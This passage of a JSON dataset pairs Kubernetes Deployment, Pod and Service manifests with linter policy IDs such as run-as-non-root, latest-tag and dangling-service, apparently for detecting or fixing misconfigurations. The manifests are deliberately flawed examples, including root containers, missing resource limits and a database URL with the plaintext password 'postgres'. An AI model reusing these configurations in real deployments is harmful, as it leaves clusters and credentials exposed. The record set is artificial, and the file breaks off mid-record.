    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sbdemo-apserver\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sbdemo-apserver\n  template:\n    metadata:\n      labels:\n        app: sbdemo-apserver\n    spec:\n      containers:\n      - name: apserver\n        image: dayan888/springdemo:apserver\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /login\n            port: 8080\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prd\n        - name: DB_URL\n          value: jdbc:postgresql://sbdemo-postgres-service:5432/demodb?user=postgres&password=postgres\n        - name: PIC_DIR\n          value: /opt/picDir\n        - name: REDIS_HOST\n          value: sbdemo-redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        volumeMounts:\n        - mountPath: /opt/picDir\n          name: apserver-pvc\n      volumes:\n      - name: apserver-pvc\n        persistentVolumeClaim:\n          claimName: sbdemo-nfs-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"apserver\" is not set to runAsNonRoot"
  },
  {
    "id": "11521",
    "manifest_path": "data/manifests/the_stack_sample/sample_4432.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sbdemo-apserver\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sbdemo-apserver\n  template:\n    metadata:\n      labels:\n        app: sbdemo-apserver\n    spec:\n      containers:\n      - name: apserver\n        image: dayan888/springdemo:apserver\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /login\n            port: 8080\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prd\n        - name: DB_URL\n          value: jdbc:postgresql://sbdemo-postgres-service:5432/demodb?user=postgres&password=postgres\n        - name: PIC_DIR\n          value: /opt/picDir\n        - name: REDIS_HOST\n          value: sbdemo-redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        volumeMounts:\n        - mountPath: /opt/picDir\n          name: apserver-pvc\n      volumes:\n      - name: apserver-pvc\n        persistentVolumeClaim:\n          claimName: sbdemo-nfs-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"apserver\" has cpu request 0"
  },
  {
    "id": "11522",
    "manifest_path": "data/manifests/the_stack_sample/sample_4432.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sbdemo-apserver\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sbdemo-apserver\n  template:\n    metadata:\n      labels:\n        app: sbdemo-apserver\n    spec:\n      containers:\n      - name: apserver\n        image: dayan888/springdemo:apserver\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /login\n            port: 8080\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prd\n        - name: DB_URL\n          value: jdbc:postgresql://sbdemo-postgres-service:5432/demodb?user=postgres&password=postgres\n        - name: PIC_DIR\n          value: /opt/picDir\n        - name: REDIS_HOST\n          value: sbdemo-redis-service\n        - name: REDIS_PORT\n          value: '6379'\n        volumeMounts:\n        - mountPath: /opt/picDir\n          name: apserver-pvc\n      volumes:\n      - name: apserver-pvc\n        persistentVolumeClaim:\n          claimName: sbdemo-nfs-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"apserver\" has memory limit 0"
  },
  {
    "id": "11523",
    "manifest_path": "data/manifests/the_stack_sample/sample_4434.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20200608-16190316cf\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "11524",
    "manifest_path": "data/manifests/the_stack_sample/sample_4434.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20200608-16190316cf\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "11525",
    "manifest_path": "data/manifests/the_stack_sample/sample_4434.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20200608-16190316cf\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "11526",
    "manifest_path": "data/manifests/the_stack_sample/sample_4434.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20200608-16190316cf\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "11527",
    "manifest_path": "data/manifests/the_stack_sample/sample_4434.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20200608-16190316cf\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "11528",
    "manifest_path": "data/manifests/the_stack_sample/sample_4435.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\n  annotations:\n    seccomp.security.alpha.kubernetes.io/pod: localhost/operator/security-profiles-operator/nginx-1.19.1.json\nspec:\n  containers:\n  - name: test-container\n    image: nginx:1.19.1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-container\" does not have a read-only root file system"
  },
  {
    "id": "11529",
    "manifest_path": "data/manifests/the_stack_sample/sample_4435.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\n  annotations:\n    seccomp.security.alpha.kubernetes.io/pod: localhost/operator/security-profiles-operator/nginx-1.19.1.json\nspec:\n  containers:\n  - name: test-container\n    image: nginx:1.19.1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-container\" is not set to runAsNonRoot"
  },
  {
    "id": "11530",
    "manifest_path": "data/manifests/the_stack_sample/sample_4435.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\n  annotations:\n    seccomp.security.alpha.kubernetes.io/pod: localhost/operator/security-profiles-operator/nginx-1.19.1.json\nspec:\n  containers:\n  - name: test-container\n    image: nginx:1.19.1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-container\" has cpu request 0"
  },
  {
    "id": "11531",
    "manifest_path": "data/manifests/the_stack_sample/sample_4435.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\n  annotations:\n    seccomp.security.alpha.kubernetes.io/pod: localhost/operator/security-profiles-operator/nginx-1.19.1.json\nspec:\n  containers:\n  - name: test-container\n    image: nginx:1.19.1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-container\" has memory limit 0"
  },
  {
    "id": "11532",
    "manifest_path": "data/manifests/the_stack_sample/sample_4437.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ship-manager-backend\nspec:\n  selector:\n    app: ship-manager-backend\n  ports:\n  - name: http\n    port: 80\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ship-manager-backend])"
  },
  {
    "id": "11533",
    "manifest_path": "data/manifests/the_stack_sample/sample_4441.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/name: nats\n    app.kubernetes.io/version: 2.7.1\n    helm.sh/chart: nats-0.12.1\n  name: RELEASE-NAME-nats\n  namespace: default\nspec:\n  clusterIP: None\n  ports:\n  - name: client\n    port: 4222\n  - name: cluster\n    port: 6222\n  - name: monitor\n    port: 8222\n  - name: metrics\n    port: 7777\n  - name: leafnodes\n    port: 7422\n  - name: gateways\n    port: 7522\n  selector:\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/name: nats\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/instance:RELEASE-NAME app.kubernetes.io/name:nats])"
  },
  {
    "id": "11534",
    "manifest_path": "data/manifests/the_stack_sample/sample_4443.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: emby\nspec:\n  selector:\n    matchLabels:\n      app: emby\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: emby\n    spec:\n      containers:\n      - name: emby\n        image: emby/embyserver\n        ports:\n        - containerPort: 8096\n        volumeMounts:\n        - name: media-movies-35\n          mountPath: /mnt/media-movies\n        - name: media-series-35\n          mountPath: /mnt/media-series\n        - name: audiobooks-35\n          mountPath: /books\n        - name: config-emby-5\n          mountPath: /config\n      volumes:\n      - name: media-movies-35\n        persistentVolumeClaim:\n          claimName: media-movies-35\n      - name: media-series-35\n        persistentVolumeClaim:\n          claimName: media-series-35\n      - name: audiobooks-35\n        persistentVolumeClaim:\n          claimName: audiobooks-35\n      - name: config-emby-5\n        persistentVolumeClaim:\n          claimName: config-emby-5\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"emby\" is using an invalid container image, \"emby/embyserver\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11535",
    "manifest_path": "data/manifests/the_stack_sample/sample_4443.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: emby\nspec:\n  selector:\n    matchLabels:\n      app: emby\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: emby\n    spec:\n      containers:\n      - name: emby\n        image: emby/embyserver\n        ports:\n        - containerPort: 8096\n        volumeMounts:\n        - name: media-movies-35\n          mountPath: /mnt/media-movies\n        - name: media-series-35\n          mountPath: /mnt/media-series\n        - name: audiobooks-35\n          mountPath: /books\n        - name: config-emby-5\n          mountPath: /config\n      volumes:\n      - name: media-movies-35\n        persistentVolumeClaim:\n          claimName: media-movies-35\n      - name: media-series-35\n        persistentVolumeClaim:\n          claimName: media-series-35\n      - name: audiobooks-35\n        persistentVolumeClaim:\n          claimName: audiobooks-35\n      - name: config-emby-5\n        persistentVolumeClaim:\n          claimName: config-emby-5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"emby\" does not have a read-only root file system"
  },
  {
    "id": "11536",
    "manifest_path": "data/manifests/the_stack_sample/sample_4443.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: emby\nspec:\n  selector:\n    matchLabels:\n      app: emby\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: emby\n    spec:\n      containers:\n      - name: emby\n        image: emby/embyserver\n        ports:\n        - containerPort: 8096\n        volumeMounts:\n        - name: media-movies-35\n          mountPath: /mnt/media-movies\n        - name: media-series-35\n          mountPath: /mnt/media-series\n        - name: audiobooks-35\n          mountPath: /books\n        - name: config-emby-5\n          mountPath: /config\n      volumes:\n      - name: media-movies-35\n        persistentVolumeClaim:\n          claimName: media-movies-35\n      - name: media-series-35\n        persistentVolumeClaim:\n          claimName: media-series-35\n      - name: audiobooks-35\n        persistentVolumeClaim:\n          claimName: audiobooks-35\n      - name: config-emby-5\n        persistentVolumeClaim:\n          claimName: config-emby-5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"emby\" is not set to runAsNonRoot"
  },
  {
    "id": "11537",
    "manifest_path": "data/manifests/the_stack_sample/sample_4443.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: emby\nspec:\n  selector:\n    matchLabels:\n      app: emby\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: emby\n    spec:\n      containers:\n      - name: emby\n        image: emby/embyserver\n        ports:\n        - containerPort: 8096\n        volumeMounts:\n        - name: media-movies-35\n          mountPath: /mnt/media-movies\n        - name: media-series-35\n          mountPath: /mnt/media-series\n        - name: audiobooks-35\n          mountPath: /books\n        - name: config-emby-5\n          mountPath: /config\n      volumes:\n      - name: media-movies-35\n        persistentVolumeClaim:\n          claimName: media-movies-35\n      - name: media-series-35\n        persistentVolumeClaim:\n          claimName: media-series-35\n      - name: audiobooks-35\n        persistentVolumeClaim:\n          claimName: audiobooks-35\n      - name: config-emby-5\n        persistentVolumeClaim:\n          claimName: config-emby-5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"emby\" has cpu request 0"
  },
  {
    "id": "11538",
    "manifest_path": "data/manifests/the_stack_sample/sample_4443.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: emby\nspec:\n  selector:\n    matchLabels:\n      app: emby\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: emby\n    spec:\n      containers:\n      - name: emby\n        image: emby/embyserver\n        ports:\n        - containerPort: 8096\n        volumeMounts:\n        - name: media-movies-35\n          mountPath: /mnt/media-movies\n        - name: media-series-35\n          mountPath: /mnt/media-series\n        - name: audiobooks-35\n          mountPath: /books\n        - name: config-emby-5\n          mountPath: /config\n      volumes:\n      - name: media-movies-35\n        persistentVolumeClaim:\n          claimName: media-movies-35\n      - name: media-series-35\n        persistentVolumeClaim:\n          claimName: media-series-35\n      - name: audiobooks-35\n        persistentVolumeClaim:\n          claimName: audiobooks-35\n      - name: config-emby-5\n        persistentVolumeClaim:\n          claimName: config-emby-5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"emby\" has memory limit 0"
  },
  {
    "id": "11539",
    "manifest_path": "data/manifests/the_stack_sample/sample_4444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1446\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11540",
    "manifest_path": "data/manifests/the_stack_sample/sample_4444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1446\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11541",
    "manifest_path": "data/manifests/the_stack_sample/sample_4444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1446\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11542",
    "manifest_path": "data/manifests/the_stack_sample/sample_4444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1446\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11543",
    "manifest_path": "data/manifests/the_stack_sample/sample_4444.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1446\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11544",
    "manifest_path": "data/manifests/the_stack_sample/sample_4448.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: database-service\nspec:\n  ports:\n  - port: 3306\n    protocol: TCP\n  selector:\n    app: database\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:database])"
  },
  {
    "id": "11545",
    "manifest_path": "data/manifests/the_stack_sample/sample_4451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demoapp\n  labels:\n    app: demoapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: demoapp\n  template:\n    metadata:\n      labels:\n        app: demoapp\n    spec:\n      containers:\n      - name: demoapp\n        image: satak/demoapp:0.1.0\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"demoapp\" does not have a read-only root file system"
  },
  {
    "id": "11546",
    "manifest_path": "data/manifests/the_stack_sample/sample_4451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demoapp\n  labels:\n    app: demoapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: demoapp\n  template:\n    metadata:\n      labels:\n        app: demoapp\n    spec:\n      containers:\n      - name: demoapp\n        image: satak/demoapp:0.1.0\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"demoapp\" is not set to runAsNonRoot"
  },
  {
    "id": "11547",
    "manifest_path": "data/manifests/the_stack_sample/sample_4451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demoapp\n  labels:\n    app: demoapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: demoapp\n  template:\n    metadata:\n      labels:\n        app: demoapp\n    spec:\n      containers:\n      - name: demoapp\n        image: satak/demoapp:0.1.0\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"demoapp\" has cpu request 0"
  },
  {
    "id": "11548",
    "manifest_path": "data/manifests/the_stack_sample/sample_4451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demoapp\n  labels:\n    app: demoapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: demoapp\n  template:\n    metadata:\n      labels:\n        app: demoapp\n    spec:\n      containers:\n      - name: demoapp\n        image: satak/demoapp:0.1.0\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"demoapp\" has memory limit 0"
  },
  {
    "id": "11549",
    "manifest_path": "data/manifests/the_stack_sample/sample_4452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-server-deploy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: node\n  template:\n    metadata:\n      labels:\n        app: node\n    spec:\n      containers:\n      - name: nodee\n        image: gcr.io/cwxstat-23/cwxstat:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nodee\" is using an invalid container image, \"gcr.io/cwxstat-23/cwxstat:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11550",
    "manifest_path": "data/manifests/the_stack_sample/sample_4452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-server-deploy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: node\n  template:\n    metadata:\n      labels:\n        app: node\n    spec:\n      containers:\n      - name: nodee\n        image: gcr.io/cwxstat-23/cwxstat:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11551",
    "manifest_path": "data/manifests/the_stack_sample/sample_4452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-server-deploy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: node\n  template:\n    metadata:\n      labels:\n        app: node\n    spec:\n      containers:\n      - name: nodee\n        image: gcr.io/cwxstat-23/cwxstat:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nodee\" does not have a read-only root file system"
  },
  {
    "id": "11552",
    "manifest_path": "data/manifests/the_stack_sample/sample_4452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-server-deploy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: node\n  template:\n    metadata:\n      labels:\n        app: node\n    spec:\n      containers:\n      - name: nodee\n        image: gcr.io/cwxstat-23/cwxstat:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nodee\" is not set to runAsNonRoot"
  },
  {
    "id": "11553",
    "manifest_path": "data/manifests/the_stack_sample/sample_4452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-server-deploy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: node\n  template:\n    metadata:\n      labels:\n        app: node\n    spec:\n      containers:\n      - name: nodee\n        image: gcr.io/cwxstat-23/cwxstat:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nodee\" has cpu request 0"
  },
  {
    "id": "11554",
    "manifest_path": "data/manifests/the_stack_sample/sample_4452.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-server-deploy\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: node\n  template:\n    metadata:\n      labels:\n        app: node\n    spec:\n      containers:\n      - name: nodee\n        image: gcr.io/cwxstat-23/cwxstat:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nodee\" has memory limit 0"
  },
  {
    "id": "11555",
    "manifest_path": "data/manifests/the_stack_sample/sample_4453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: monitoring-influxdb\n  namespace: kube-system\n  labels:\n    kubernetes.io/cluster-service: 'true'\n    addonmanager.kubernetes.io/mode: Reconcile\n    kubernetes.io/name: InfluxDB\nspec:\n  type: NodePort\n  ports:\n  - name: http\n    port: 8083\n    targetPort: 8083\n  - name: api\n    port: 8086\n    targetPort: 8086\n  selector:\n    k8s-app: influxGrafana\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:influxGrafana])"
  },
  {
    "id": "11556",
    "manifest_path": "data/manifests/the_stack_sample/sample_4454.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3362\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11557",
    "manifest_path": "data/manifests/the_stack_sample/sample_4454.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3362\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11558",
    "manifest_path": "data/manifests/the_stack_sample/sample_4454.yaml",
